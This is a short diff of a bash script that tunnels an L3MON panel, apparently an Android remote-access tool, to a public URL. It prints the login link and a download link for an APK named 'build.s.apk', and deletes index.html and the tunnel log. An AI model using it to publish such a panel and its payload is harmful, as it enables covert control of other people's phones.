@@ -1,7 +1,6 @@
 #!/bin/bash
 
-# Install Openssh
-# apk add openssh
+rm -f index.html
 
 TUNNEL_LOG=$(mktemp)
 
@@ -14,8 +13,8 @@ done
 
 TUNNEL_URL=$(grep -oE "https?://[a-zA-Z0-9./?=_-]*" "$TUNNEL_LOG" | head -n 1)
 
-echo "Your L3MON login panel is accessible at: $TUNNEL_URL"
-echo "Your L3MON login panel is accessible at: $TUNNEL_URL/build.s.apk"
+echo -e "LOGIN    : \e[33m$TUNNEL_URL\e[0m"
+echo -e "DOWNLOAD : \e[33m$TUNNEL_URL/build.s.apk\e[0m"
+rm -f "$TUNNEL_LOG"
 
 disown $SSH_PID
-                  
